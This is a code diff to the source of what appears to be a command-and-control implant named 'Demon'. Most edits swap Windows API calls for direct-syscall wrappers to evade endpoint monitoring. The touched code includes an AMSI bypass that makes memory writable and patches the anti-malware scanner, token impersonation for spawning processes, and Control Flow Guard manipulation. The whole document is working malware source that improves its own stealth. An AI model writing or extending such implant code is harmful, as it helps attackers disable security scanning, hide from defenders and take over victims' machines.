@@ -1,8 +1,9 @@
+#include <Demon.h>
+
 #include <Core/Win32.h>
 #include <Core/MiniStd.h>
 #include <Core/Package.h>
 #include <Core/Syscalls.h>
-
 #include <Common/Macros.h>
 
 /*!
@@ -224,7 +225,7 @@ BOOL ProcessIsWow(
         return FALSE;
     }
 
-    if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtQueryInformationProcess( Process, ProcessWow64Information, &IsWow64, sizeof( PVOID ), NULL ) ) ) {
+    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationProcess( Process, ProcessWow64Information, &IsWow64, sizeof( PVOID ), NULL ) ) ) {
         PRINTF( "[!] NtQueryInformationProcess Failed: Handle[%x] Status[%lx]\n", Process, NtStatus )
         IsWow64 = FALSE;
     }
@@ -310,7 +311,7 @@ BOOL ProcessCreate(
             lpCurrentDirectory = Path;
         }
 
-        TokenImpersonate(FALSE);
+        TokenImpersonate( FALSE );
         TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
 
         PRINTF( "CmdLine           : %ls\n", CmdLine )
@@ -333,7 +334,7 @@ BOOL ProcessCreate(
                 )
             {
                 PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
-                TokenImpersonate(TRUE);
+                TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
@@ -359,7 +360,7 @@ BOOL ProcessCreate(
                 )
             {
                 PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
-                TokenImpersonate(TRUE);
+                TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
@@ -423,9 +424,9 @@ BOOL ProcessCreate(
             MemCopy( s, CmdLine, x );
 
             // remove the arguments. we are just interested in the process name/path
-            for ( ; i < x; i++ )
+            for ( ; i < x; i++ ) {
                 if ( s[ i ] == ' ' ) break;
-            PUTS( s )
+            } PUTS( s )
             s[ i ] = 0;
 
             PRINTF( "Process start :: Path:[%ls] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );
@@ -465,7 +466,7 @@ NTSTATUS ProcessSnapShot(
     }
 
     /* Get our system process list */
-    if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &Length ) ) )
+    if ( ! NT_SUCCESS( NtStatus = SysNtQuerySystemInformation( SystemProcessInformation, NULL, 0, &Length ) ) )
     {
         PRINTF( "SystemProcessInformation Length: %d\n", Length );
 
@@ -475,7 +476,7 @@ NTSTATUS ProcessSnapShot(
         /* allocate memory */
         *SnapShot = NtHeapAlloc( Length );
         if ( *SnapShot ) {
-            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtQuerySystemInformation( SystemProcessInformation, *SnapShot, Length, &Length ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = SysNtQuerySystemInformation( SystemProcessInformation, *SnapShot, Length, &Length ) ) ) {
                 PRINTF( "NtQuerySystemInformation Failed: Status[%lx]\n", NtStatus )
                 goto LEAVE;
             }
@@ -573,10 +574,10 @@ BOOL BypassPatchAMSI(
     ULONG  OldProtection, NewProtection;
     SIZE_T uSize = sizeof(amsiPatch);
 
-    if ( NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) ) {
+    if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) ) {
         MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );
 
-        if ( NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) ) {
+        if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) ) {
             return TRUE;
         }
 
@@ -811,7 +812,7 @@ BOOL CfgQueryEnforced(
     ProcInfoEx.ExtendedProcessInfoBuffer = 0;
 
     /* query if Cfg is enabled or not. */
-    if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtQueryInformationProcess(
+    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationProcess(
         NtCurrentProcess(),
         ProcessCookie | ProcessUserModeIOPL,
         &ProcInfoEx,
@@ -858,7 +859,7 @@ VOID CfgAddressAdd(
     VmInfo.pMustBeZero       = FALSE;
     VmInfo.pMoarZero         = FALSE;
 
-    if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtSetInformationVirtualMemory( NtCurrentProcess(), VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) ) ) ) {
+    if ( ! NT_SUCCESS( NtStatus = SysNtSetInformationVirtualMemory( NtCurrentProcess(), VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) ) ) ) {
         PRINTF( "NtSetInformationVirtualMemory Failed => %p", NtStatus );
     }
 }
